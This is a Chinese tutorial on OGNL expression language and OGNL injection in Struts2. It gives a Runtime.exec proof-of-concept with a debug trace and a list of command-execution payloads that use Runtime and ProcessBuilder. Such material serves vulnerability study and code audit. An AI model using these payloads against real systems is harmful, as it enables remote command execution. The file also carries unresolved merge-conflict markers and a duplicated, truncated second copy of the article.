<<<<<<< HEAD
## 0x01 OGNL表达式基础

### OGNL简介

OGNL全称Object-Graph Navigation Language即对象导航图语言，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。

OGNL使用**Java反射**和**内省**来解决运行时应用程序的对象图。这允许程序根据对象图的状态改变行为，而不是依赖于编译时设置。它还允许更改对象图。

简单了解下Java内省机制：

> Java语言内省（Introspector）是Java语言对Bean类属性、事件的一种缺省处理方法。例如类A中有属性name,那我们可以通过getName,setName来得到其值或者设置新的值。通过getName/setName来访问name属性，这就是默认的规则。Java中提供了一套API用来访问某个属性的getter/setter方法，通过这些API可以使你不需要了解这个规则（但你最好还是要搞清楚），这些API存放于包java.beans中。
>
> 一般的做法是通过类Introspector来获取某个对象的BeanInfo信息，然后通过BeanInfo来获取属性的描述器（PropertyDescriptor），通过这个属性描述器就可以获取某个属性对应的getter/setter方法，然后我们就可以通过反射机制来调用这些方法。

OGNL可以让我们用非常简单的表达式访问对象层，例如，当前环境的根对象为user1，则表达式person.address[0].province可以访问到user1的person属性的第一个address的province属性。

webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。

OGNL表达式具有以下特点：

- 支持对象方法调用，如`objName.methodName()`；
- 支持类静态方法调用和值访问，表达式的格式为`@[类全名（包括包路径）]@[方法名|值名]`，如@java.lang.String@format(‘fruit%s’,’frt’)；
- 支持赋值操作和表达式串联，如price=100、discount=0.8，calculatePrice(price*discount)这个表达式会返回80；
- 访问OGNL上下文（OGNL context）和ActionContext；
- 操作集合对象；
- 可以直接new一个对象；

### OGNL三要素

OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。

- 表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；
- 根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；
- 上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；

这样不难知道，OGNL的context是包含root的。

Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1.png)

### ActionContext

ActionContext是上下文对象，对应OGNL的context，是一个以MAP为结构、利用键值对关系来描述对象中的属性以及值的对象，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个ActionContext中。

借网上的一个图看下ActionContext中包含哪些东西：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2.png)

除了三个常见的作用域`request`、`session`、`application`外，还有以下三个作用域：

- attr：保存着上面三个作用域的所有属性，如果有重复的则以request域中的属性为基准；
- paramters：保存的是表单提交的参数；
- VALUE_STACK：值栈，保存着valueStack对象，也就是说可以通过ActionContext访问到valueStack中的值；

### ValueStack

值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。

在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。

#### 值栈的作用

值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。

值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。

要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。

#### 在request中获取值栈

ValueStack对象在request范围内的存储方式为`request.setAttribute("struts.valueStack",valuestack)`，可以通过如下方式从request中取出值栈的信息。

```
//获取 ValueStack 对象，通过 request 对象获取
ValueStack valueStack = (ValueStack)ServletActionContext.getRequest()
            .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);
```

在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。

#### 在ActionContext中获取值栈

在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。

ActionContext获取ValueStack对象的方式如下所示：

```
//通过 ActionContext 获取 valueStack 对象
ValueStack valueStack = ActionContext.getContext().getValueStack();
```

ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。

方法中还有这样一段代码：

```
ctx = new ActionContext(stack.getContext());
```

从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。

### OGNL基本语法

OGNL支持各种纷繁复杂的表达式。但是最最基本的表达式的原型，是将对象的引用值用点串联起来，从左到右，每一次表达式计算返回的结果成为当前对象，后面部分接着在当前对象上进行计算，一直到全部表达式计算完成，返回最后得到的对象。OGNL则针对这条基本原则进行不断的扩充，从而使之支持对象树、数组、容器的访问，甚至是类似SQL中的投影选择等操作。

#### 基本对象树的访问

对象树的访问就是通过使用点号将对象的引用串联起来进行。例如：

```
xxxx
xxxx.xxxx
xxxx.xxxx.xxxx.xxxx.xxxx
```

#### 对容器变量的访问

对容器变量的访问，通过#符号加上表达式进行。例如：

```
#xxxx
#xxxx.xxxx
#xxxx.xxxxx.xxxx.xxxx.xxxx
```

#### 使用操作符号

OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用`+, -, *, /, ++, --, ==, !=, =`等操作符之外，还能使用`mod, in, not in`等。

#### 容器、数组、对象

OGNL支持对数组和ArrayList等容器的顺序访问。例如：`group.users[0]`

同时，OGNL支持对Map的按键值查找。例如：`#session['mySessionPropKey']`

不仅如此，OGNL还支持容器的构造的表达式。例如：`{"green", "red", "blue"}`构造一个List，`#{"key1" : "value1", "key2" : "value2", "key3" : "value3"}`构造一个Map

你也可以通过任意类对象的构造函数进行对象新建。例如：`new Java.net.URL("xxxxxx/")`

#### 对静态方法或变量的访问

要引用类的静态方法和字段，他们的表达方式是一样的`@class@member`或者`@class@method(args)`。

例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources

#### 方法调用

直接通过类似Java的方法调用方式进行，你甚至可以传递参数。

例如：`user.getName()`，`group.users.size()`，`group.containsUser(#requestUser)`

#### 投影和选择

OGNL支持类似数据库中的投影（projection） 和选择（selection）。

投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 `collection.{XXX}`，其中XXX是这个集合中每个元素的公共属性。

例如：`group.userList.{username}`将获得某个group中的所有user的name的列表。

选择就是过滤满足selection条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：`collection.{X YYY}`，其中X是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：

- `?`选择满足条件的所有元素
- `^`选择满足条件的第一个元素
- `$`选择满足条件的最后一个元素

例如：`group.userList.{? #txxx.xxx != null}`将获得某个group中user的name不为空的user的列表。

### OGNL语法树

OGNL语法树有两种形式：

- (expression)(constant) = value
- (constant)((expression1)(expression2))

每个括号对应语法树上的一个分支，并且从最右边的叶子节点开始解析执行。

### 关于”.”符号

所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。

如：

```
name.toCharArray()[0].numbericValue.toString()
```

- 提取根(root)对象的name属性
- 调用上一步返回的结果字符串的toCharArray()方法
- 提取返回结果数组的第一个字符
- 获取字符的numbericValue属性，该字符是一个Character对象，Character类有个getNumeericValue()方法
- 调用结果Integer对象的toString()方法

### # 和 % 和 $ 的区别

#### #符

`#`符主要有三种用途：

- 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于`ActionContext.getContext()`；
- 用于过滤和投影（projecting）集合，如`books.{? #this.price<100}`；
- 用于构造Map，如`#{'foo1':'bar1', 'foo2':'bar2'}`；

#### %符

`%`符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。

#### $符

`$`符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。

### # 和 . 和 @ 的区别

- 获取静态函数和变量的时候用@
- 获取非静态函数用.号获取
- 获取非静态变量用#获取

### 基本用法Demo

依赖的jar包：ognl-2.6.11.jar

示例代码1，基本的调用执行OGNL表达式：

```
import ognl.Ognl;
import ognl.OgnlContext;

public class Test {
    public static void main(String[] args) throws Exception {
        String str = "1+2";
        OgnlContext context = new OgnlContext();
        Object ognl = Ognl.parseExpression(str);
        Object value = Ognl.getValue(ognl,context,context.getRoot());
        System.out.println("result:" + value);
    }
}
```

运行即可输出`result:3`。

示例代码2，使用#符号从上下文获取变量值：

```
import ognl.Ognl;
import ognl.OgnlContext;

public class Test {
    public static void main(String[] args) throws Exception {
        User user = new User();
        user.setName("mi1k7ea");
        OgnlContext context = new OgnlContext();
        context.put("user",user);
        String str = "#user.name";
        Object ognl = Ognl.parseExpression(str);
        Object value = Ognl.getValue(ognl,context,context.getRoot());
        System.out.println("result:" + value);
    }
}
```

运行输出`result:mi1k7ea`。

### OGNL与EL的区别

因为OGNL表达式是Struts2的默认表达式语言，所以只针对Struts2标签有效；然而EL在HTML中也可以使用。

Struts2标签用的都是OGNL表达式语言，所以它多数都是去值栈的栈顶找值，找不到再去作用域；相反，EL都是去Map集合作用域中找。

页面取值区别如下表：

| 名称        | servlet                                                      | OGNL                                                         | EL                           |
| :---------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :--------------------------- |
| parameters  | request.getParameter(“username”)                             | #username                                                    | ${username}                  |
| request     | request.getAttribute(“userName”)                             | #request.userName                                            | ${requestScope.username}     |
| session     | session.getAttribute(“userName”)                             | #session.userName                                            | ${sessionScope.username}     |
| application | application.getAttribute(“userName”)                         | #application.userName                                        | ${applicationScope.username} |
| attr        | 用于按request > session > application顺序访问其属性（attribute） | #attr.userName相当于按顺序在以上三个范围（scope）内读取userName属性，直到找到为止 |                              |

## 0x02 能解析OGNL的API

能解析OGNL的API如下表：

| 类名                                        | 方法名                                                       |
| :------------------------------------------ | :----------------------------------------------------------- |
| com.opensymphony.xwork2.util.TextParseUtil  | translateVariables,translateVariablesCollection              |
| com.opensymphony.xwork2.util.TextParser     | evaluate                                                     |
| com.opensymphony.xwork2.util.OgnlTextParser | evaluate                                                     |
| com.opensymphony.xwork2.ognl.OgnlUtil       | setProperties,setProperty,setValue,getValue,callMethod,compile |
| org.apache.struts2.util.VelocityStrutsUtil  | evaluate                                                     |
| org.apache.struts2.util.StrutsUtil          | isTrue,findString,findValue,getText,translateVariables,makeSelectList |
| org.apache.struts2.views.jsp.ui.OgnlTool    | findValue                                                    |
| com.opensymphony.xwork2.util.ValueStack     | findString,findValue,setValue,setParameter                   |
| com.opensymphony.xwork2.ognl.OgnlValueStack | findString,findValue,setValue,setParameter,trySetValue       |
| ognl.Ognl                                   | parseExpression,getValue,setValue                            |

以下是调用过程中可能会涉及到的一些类：

| 涉及类名                                                   | 方法名                                                       |
| :--------------------------------------------------------- | :----------------------------------------------------------- |
| com.opensymphony.xwork2.ognl.OgnlReflectionProvider        | getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue |
| com.opensymphony.xwork2.util.reflection.ReflectionProvider | getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue |

## 0x03 OGNL表达式注入漏洞

### 漏洞原理

由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。

最简单的弹计算器的Demo：

```
import ognl.Ognl;
import ognl.OgnlContext;

public class Test {
    public static void main(String[] args) throws Exception {
        // 创建一个OGNL上下文对象
        OgnlContext context = new OgnlContext();

        // getValue()触发
        // @[类全名(包括包路径)]@[方法名|值名]
        Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.getRoot());
        
        // setValue()触发
//        Ognl.setValue(Runtime.getRuntime().exec("calc"), context, context.getRoot());
    }
}
```

getValue()和setValue()都能成功解析恶意的OGNL表达式、触发弹计算器：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/3.png)

### 调试分析

这里简单调试分析下Ognl.getValue()解析OGNL表达式到执行命令的过程。

在前面的`Ognl.getValue`代码处打下断点，往下调试，看到调用了parseExpression()函数，该函数将传入的String类型的字符串解析为OGNL表达式能理解的ASTChain类型：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/5.png)

往下，将传入的ASTChain类型的tree参数转换成Node类型（ASTChain继承自SimpleNode、SimpleNode继承自Node）再调用其getValue()函数继续解析：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/6.png)

由于tree变量就是表达式解析来的东西，因此接下来的调用中局部环境中的this变量的值就是我们的OGNL表达式的内容。往下就是调用的SimpleNode.getValue()函数，其中调用了evaluateGetValueBody()函数：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/7.png)

evaluateGetValueBody()函数，顾名思义，用于计算getValue体中OGNL表达式的值。跟进看是直接调用了getValueBody()函数：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/8.png)

跟下去，就是调用的ASTChain.getValueBody()函数，这里会循环解析ASTChain中每个节点的表达式，这里有两个子节点，首先会解析第一个节点即[`@java.lang.Runtime](mailto:`@java.lang.Runtime)@getRuntime()`这个OGNL表达式：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/9.png)

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/10.png)

跟进第一个子节点的解析过程，在ASTStaticMethod.getValueBody()函数中调用了OgnlRuntime.callStaticMethod()方法，其中已经将第一个子节点的表达式中的类和方法分别提取出来了：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11.png)

跟进去，其中调用了classForName()函数来根据className参数寻找到java.lang.Runtime类，再往下解析：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/12.png)

往下，调用OgnlRuntime.getMethods()函数获取到java.lang.Runtime类的getRuntime()方法后，进一步调用OgnlRuntime.callAppropriateMethod()函数进行解析：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/13.png)

跟进OgnlRuntime.callAppropriateMethod()函数中，这里就是通过调用invokeMethod()函数来实现OGNL表达式中的类方法的调用：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/14.png)

跟进它的invokeMethod()函数，看到是Method.invoke()即通过反射机制实现java.lang.Runtime.getRuntime()方法的调用：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/15.png)

当然这里只是ASTChain的第一个子节点，该类方法执行完还没弹计算器，关键还要解析完ASTChain的第二个子节点、形成解析OGNL表达式节点链来实现完整的类方法调用。

接着调试，我们会返回到ASTChain.getValueBody()函数的for循环中继续循坏遍历解析第二个子节点，可以看到此时第二个子节点的OGNL表达式内容为`exec("calc")`：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/16.png)

后面的解析过程和解析第一个子节点的时候几乎是一样的。在调用OgnlRuntime.callMethod()函数时，参数source为前面解析第一个子节点表达式时得到的Runtime类，另外两个参数则为分辨出的方法名和参数值：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17.png)

往下，解析得到具体的类方法exec()：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/18.png)

往下，就是反射调用Runtime.exec()函数实现任意类方法调用来谈计算器了：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/19.png)

此时函数调用栈如下：

```
invokeMethod:518, OgnlRuntime (ognl)
callAppropriateMethod:812, OgnlRuntime (ognl)
callMethod:61, ObjectMethodAccessor (ognl)
callMethod:846, OgnlRuntime (ognl)
getValueBody:73, ASTMethod (ognl)
evaluateGetValueBody:170, SimpleNode (ognl)
getValue:210, SimpleNode (ognl)
getValueBody:109, ASTChain (ognl)
evaluateGetValueBody:170, SimpleNode (ognl)
getValue:210, SimpleNode (ognl)
getValue:333, Ognl (ognl)
getValue:378, Ognl (ognl)
getValue:357, Ognl (ognl)
main:11, Test
```

简单地说，OGNL表达式的getValue()解析过程就是先将整个OGNL表达式按照语法树分为几个子节点树，然后循环遍历解析各个子节点树上的OGNL表达式，其中通过Method.invoke()即反射的方式实现任意类方法调用，将各个节点解析获取到的类方法通过ASTChain链的方式串连起来实现完整的表达式解析、得到完整的类方法调用。

### HTTP请求中常见的注入点

HTTP请求中常见的注入点如下表（来自[Struts2著名RCE漏洞引发的十年之思](https://www.freebuf.com/vuls/168609.html)）：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/4.png)

### 常用payload

```
//获取context里面的变量
 #user
 #user.name

//使用runtime执行系统命令
@java.lang.Runtime@getRuntime().exec("calc")


//使用processbuilder执行系统命令
(new java.lang.ProcessBuilder(new java.lang.String[]{"calc"})).start()

//获取当前路径
@java.lang.System@getProperty("user.dir")
```

## 0x04 Struts2中OGNL执行过程分析

有时间再调试分析，可参考：[浅析 OGNL 的攻防史](https://paper.seebug.org/794/#0x02-ognl)

## 0x05 OGNL攻防史

有时间再详细分析，可参考：[浅析 OGNL 的攻防史](https://paper.seebug.org/794/#0x03-ognl)

## 0x06 参考

[OGNL](http://c.biancheng.net/view/4131.html)

[OGNL表达式注入分析](http://p0desta.com/2019/04/06/从零开始java代码审计系列(三)/)

=======
## 0x01 OGNL表达式基础

### OGNL简介

OGNL全称Object-Graph Navigation Language即对象导航图语言，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。

OGNL使用**Java反射**和**内省**来解决运行时应用程序的对象图。这允许程序根据对象图的状态改变行为，而不是依赖于编译时设置。它还允许更改对象图。

简单了解下Java内省机制：

> Java语言内省（Introspector）是Java语言对Bean类属性、事件的一种缺省处理方法。例如类A中有属性name,那我们可以通过getName,setName来得到其值或者设置新的值。通过getName/setName来访问name属性，这就是默认的规则。Java中提供了一套API用来访问某个属性的getter/setter方法，通过这些API可以使你不需要了解这个规则（但你最好还是要搞清楚），这些API存放于包java.beans中。
>
> 一般的做法是通过类Introspector来获取某个对象的BeanInfo信息，然后通过BeanInfo来获取属性的描述器（PropertyDescriptor），通过这个属性描述器就可以获取某个属性对应的getter/setter方法，然后我们就可以通过反射机制来调用这些方法。

OGNL可以让我们用非常简单的表达式访问对象层，例如，当前环境的根对象为user1，则表达式person.address[0].province可以访问到user1的person属性的第一个address的province属性。

webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。

OGNL表达式具有以下特点：

- 支持对象方法调用，如`objName.methodName()`；
- 支持类静态方法调用和值访问，表达式的格式为`@[类全名（包括包路径）]@[方法名|值名]`，如@java.lang.String@format(‘fruit%s’,’frt’)；
- 支持赋值操作和表达式串联，如price=100、discount=0.8，calculatePrice(price*discount)这个表达式会返回80；
- 访问OGNL上下文（OGNL context）和ActionContext；
- 操作集合对象；
- 可以直接new一个对象；

### OGNL三要素

OGNL具有三要素：表达式（expression）、根对象（root）和上下文对象（context）。

- 表达式（expression）：表达式是整个OGNL的核心，通过表达式来告诉OGNL需要执行什么操作；
- 根对象（root）：root可以理解为OGNL的操作对象，OGNL可以对root进行取值或写值等操作，表达式规定了“做什么”，而根对象则规定了“对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；
- 上下文对象（context）：context可以理解为对象运行的上下文环境，context以MAP的结构、利用键值对关系来描述对象中的属性以及值；

这样不难知道，OGNL的context是包含root的。

Struts2中的ActionContext即为OGNL的context（又称context map），其中包含的ValueStack即为OGNL的root。该ActionContext包含的对象如图：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1.png)

### ActionContext

ActionContext是上下文对象，对应OGNL的context，是一个以MAP为结构、利用键值对关系来描述对象中的属性以及值的对象，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个ActionContext中。

借网上的一个图看下ActionContext中包含哪些东西：

![img](http://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2.png)

除了三个常见的作用域`request`、`session`、`application`外，还有以下三个作用域：

- attr：保存着上面三个作用域的所有属性，如果有重复的则以request域中的属性为基准；
- paramters：保存的是表单提交的参数；
- VALUE_STACK：值栈，保存着valueStack对象，也就是说可以通过ActionContext访问到valueStack中的值；

### ValueStack

值栈（ValueStack）就是OGNL表达式存取数据的地方。在一个值栈中，封装了一次请求所需要的所有数据。

在使用Struts2的项目中，Struts2会为每个请求创建一个新的值栈，也就是说，值栈和请求是一一对应的关系，这种一一对应的关系使值栈能够线程安全地为每个请求提供公共的数据存取服务。

#### 值栈的作用

值栈可以作为一个数据中转站在前台与后台之间传递数据，最常见的就是将Struts2的标签与OGNL表达式结合使用。值栈实际上是一个接口，在Struts2中利用OGNL时，实际上使用的就是实现了该接口的OgnlValueStack类，这个类是OGNL的基础。

值栈贯穿整个Action的生命周期，每个Action类的对象实例都拥有一个ValueStack对象，在ValueStack对象中保存了当前Action对象和其他相关对象。

要获取值栈中存储的数据，首先应该获取值栈。值栈的获取有两种方式，具体如下。

#### 在request中获取值栈

ValueStack对象在request范围内的存储方式为`request.setAttribute("struts.valueStack",valuestack)`，可以通过如下方式从request中取出值栈的信息。

```
//获取 ValueStack 对象，通过 request 对象获取
ValueStack valueStack = (ValueStack)ServletActionContext.getRequest()
            .getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);
```

在上述示例代码中，ServletActionContext.STRUTS_VALUESTACK_KEY是ServletActionContext类中的常量，它的值为struts.valueStack。

#### 在ActionContext中获取值栈

在使用Struts2框架时，可以使用OGNL操作Context对象从ValueStack中存取数据，也就是说，可以从Context对象中获取ValueStack对象。实际上，Struts2框架中的Context对象就是ActionContext。

ActionContext获取ValueStack对象的方式如下所示：

```
//通过 ActionContext 获取 valueStack 对象
ValueStack valueStack = ActionContext.getContext().getValueStack();
```

ActionContext对象是在StrutsPrepareAndExcuteFilter的doFilter()方法中被创建的，在源码中用于创建ActionContext对象的createActionContext()方法内可以找到获取的ValueStack对象的信息。

方法中还有这样一段代码：

```
ctx = new ActionContext(stack.getContext());
```

从上述代码中可以看出，ValueStack对象中的Context对象被作为参数传递给了ActionContext对象，这也就说明ActionContext对象中持有了ValueStack对象的引用，因此可以通过ActionContext对象获取ValueStack对象。

### OGNL基本语法

OGNL支持各种纷繁复杂的表达式。但是最最基本的表达式的原型，是将对象的引用值用点串联起来，从左到右，每一次表达式计算返回的结果成为当前对象，后面部分接着在当前对象上进行计算，一直到全部表达式计算完成，返回最后得到的对象。OGNL则针对这条基本原则进行不断的扩充，从而使之支持对象树、数组、容器的访问，甚至是类似SQL中的投影选择等操作。

#### 基本对象树的访问

对象树的访问就是通过使用点号将对象的引用串联起来进行。例如：

```
xxxx
xxxx.xxxx
xxxx.xxxx.xxxx.xxxx.xxxx
```

#### 对容器变量的访问

对容器变量的访问，通过#符号加上表达式进行。例如：

```
#xxxx
#xxxx.xxxx
#xxxx.xxxxx.xxxx.xxxx.xxxx
```

#### 使用操作符号

OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用`+, -, *, /, ++, --, ==, !=, =`等操作符之外，还能使用`mod, in, not in`等。

#### 容器、数组、对象

OGNL支持对数组和ArrayList等容器的顺序访问。例如：`group.users[0]`

同时，OGNL支持对Map的按键值查找。例如：`#session['mySessionPropKey']`

不仅如此，OGNL还支持容器的构造的表达式。例如：`{"green", "red", "blue"}`构造一个List，`#{"key1" : "value1", "key2" : "value2", "key3" : "value3"}`构造一个Map

你也可以通过任意类对象的构造函数进行对象新建。例如：`new Java.net.URL("xxxxxx/")`

#### 对静态方法或变量的访问

要引用类的静态方法和字段，他们的表达方式是一样的`@class@member`或者`@class@method(args)`。

例如：@com.javaeye.core.Resource@ENABLE，@com.javaeye.core.Resource@getAllResources

#### 方法调用

直接通过类似Java的方法调用方式进行，你甚至可以传递参数。

例如：`user.getName()`，`group.users.size()`，`group.containsUser(#requestUser)`

#### 投影和选择

OGNL支持类似数据库中的投影（projection） 和选择（selection）。

投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 `collection.{XXX}`，其中XXX是这个集合中每个元素的公共属性。

例如：`group.userList.{username}`将获得某个group中的所有user的name的列表。

选择就是过滤满足selection条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：`collection.{X YYY}`，其中X是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：

- `?`选择满足条件的所有元素
- `^`选择满足条件的第一个元素
- `$`选择满足条件的最后一个元素

例如：`group.userList.{? #txxx.xxx != null}`将获得某个group中user的name不为空的user的列表。

### OGNL语法树

OGNL语法树有两种形式：

- (expression)(constant) = value
- (constant)((expression1)(expression2))

每个括号对应语法树上的一个分支，并且从最右边的叶子节点开始解析执行。

### 关于”.”符号

所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。

如：

```
name.toCharArray()[0].numbericValue.toString()
```

- 提取根(root)对象的name属性
- 调用上一步返回的结果字符串的toCharArray()方法
- 提取返回结果数组的第一个字符
- 获取字符的numbericValue属性，该字符是一个Character对象，Character类有个getNumeericValue()方法
- 调用结果Integer对象的toString()方法

### # 和 % 和 $ 的区别

#### #符

`#`符主要有三种用途：

- 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于`ActionContext.getContext()`；
- 用于过滤和投影（projecting）集合，如`books.{? #this.price<100}`；
- 用于构造Map，如`#{'foo1':'bar1', 'foo2':'bar2'}`；

#### %符

